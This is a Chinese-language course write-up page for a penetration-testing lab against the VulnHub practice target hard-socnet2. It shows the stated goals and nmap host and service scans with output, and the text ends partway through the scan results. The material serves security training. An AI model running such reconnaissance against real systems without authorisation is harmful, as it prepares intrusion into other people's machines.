@@ -1,0 +1,2378 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../lab05/">
+      
+      
+        <link rel="next" href="../../ICS%26%26CSAPP-Lab/intro/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Lab06 - CSNote</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css">
+    
+      <link rel="stylesheet" href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&display=swap">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lab06-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CSNote" class="md-header__button md-logo" aria-label="CSNote" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CSNote
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Lab06
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CSNote" class="md-nav__button md-logo" aria-label="CSNote" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CSNote
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OI-learning
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            OI-learning
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    intro
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/C%2B%2B%20OOP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    C++ 面向对象
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Algorithm
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Algorithm
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Algorithm/STL_algorithm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    STL 算法库 ref
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Algorithm/fastpow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    快速幂
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Data Structure
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Data Structure
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_4_1" id="__nav_2_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Trees
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            Trees
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/Tree/tree-intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    树基础
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/Tree/binatree/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    二叉树基础
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/linkedlist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    链表
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/vector/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    STL vector ref
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/stack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    栈 && 单调栈
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/queue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    队列 && 单调队列
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../OI-Learning/Data-Structure/hashmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    哈希表
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Course Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Course Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ICSPA x86 note
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            ICSPA x86 note
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA0
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA2-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA2-1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/i386/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    i386 指令结构 for PA2-1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA2-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA2-2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA2-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA2-3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    网络攻防实战 Labs
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            网络攻防实战 Labs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab03
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab04
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab05
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Lab06
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab06
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透目的
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      具体操作
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="具体操作">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      信息收集
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getshell 尝试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Getshell 尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      地址爆破
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      访问主站
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      提权尝试
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透结果
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      问题分析/启示
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      其他
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ICS && CSAPP Labs
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            ICS && CSAPP Labs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICS%26%26CSAPP-Lab/intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    intro
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICS%26%26CSAPP-Lab/Datalab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CSAPP Datalab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICS%26%26CSAPP-Lab/Bomblab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CSAPP Bomblab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICS%26%26CSAPP-Lab/Binalab/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ICS Binalab
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Deep Learning
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Deep Learning
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Deep-Learning/intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    intro
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透目的
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      具体操作
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="具体操作">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      信息收集
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getshell 尝试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Getshell 尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      地址爆破
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      访问主站
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      提权尝试
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透结果
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      问题分析/启示
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      其他
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="lab06-writeup">网络攻防实战 Lab06 Writeup</h1>
+<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
+<p>✍ 1826 words  | 🐛 151 codelines  | ⏰ 8 min read | Enjoy 🎶</p>
+</div>
+<div class="admonition quote">
+<p class="admonition-title">使用的靶机为 VulnHub hard-socnet2</p>
+</div>
+<div class="admonition success">
+<p class="admonition-title">比 Lab 5 难</p>
+</div>
+<h2 id="_1">渗透目的</h2>
+<p>取得目标靶机的 root 权限</p>
+<p>了解 XML 语法；了解 Linux 栈溢出攻击的原理与具体操作</p>
+<h2 id="_2">具体操作</h2>
+<h3 id="_3">信息收集</h3>
+<p>启动 VirtualBox 中的 Kali 攻击机（用于进行渗透攻击）与 Kioptix 靶机，网络采用 NAT 连接</p>
+<p><code>ifconfig</code> 获取攻击机的 ip 为 <code>10.0.2.3</code>，使用 <code>nmap</code> 扫描 ip：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sn 10.0.2.0/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 08:52 CST
+Nmap scan report for bogon (10.0.2.1)
+Host is up (0.00051s latency).
+MAC Address: 52:55:0A:00:02:01 (Unknown)
+Nmap scan report for bogon (10.0.2.2)
+Host is up (0.00044s latency).
+MAC Address: 08:00:27:79:06:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Nmap scan report for bogon (10.0.2.6)
+Host is up (0.0027s latency).
+MAC Address: 08:00:27:E5:CD:43 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Nmap scan report for bogon (10.0.2.3)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds
+</code></pre></div></td></tr></table></div>
+<p>考虑靶机 ip 为 <code>10.0.2.6</code>，继续扫描端口 <code>nmap -sV -sC 10.0.2.6</code>，看看有哪些服务项</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sV -sC 10.0.2.6
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 08:53 CST
+Nmap scan report for bogon (10.0.2.6)
+Host is up (0.016s latency).
+Not shown: 997 closed tcp ports (reset)
+
+// SSH 服务
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:d3:4e:54:fe:66:3e:f3:b2:a5:4b:51:9f:5f:f9:c6 (RSA)
+|   256 de:86:ef:76:93:63:74:83:00:b1:a3:b8:c2:4c:8f:58 (ECDSA)
+|_  256 b5:ec:f1:1e:9a:5a:5c:d7:02:3a:9e:1b:f7:c8:b4:53 (ED25519)
+
+// Apache 服务
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Social Network
+
+// BaseHTTPServer: Python 2 中用于创建简单 HTTP 服务器的模块
+// 和上面的 Apache 一样都是 HTTP 后端
+PORT     STATE SERVICE VERSION
+8000/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.15rc1)
+|_xmlrpc-methods: XMLRPC instance doesn&#39;t support introspection.
+|_http-title: Error response
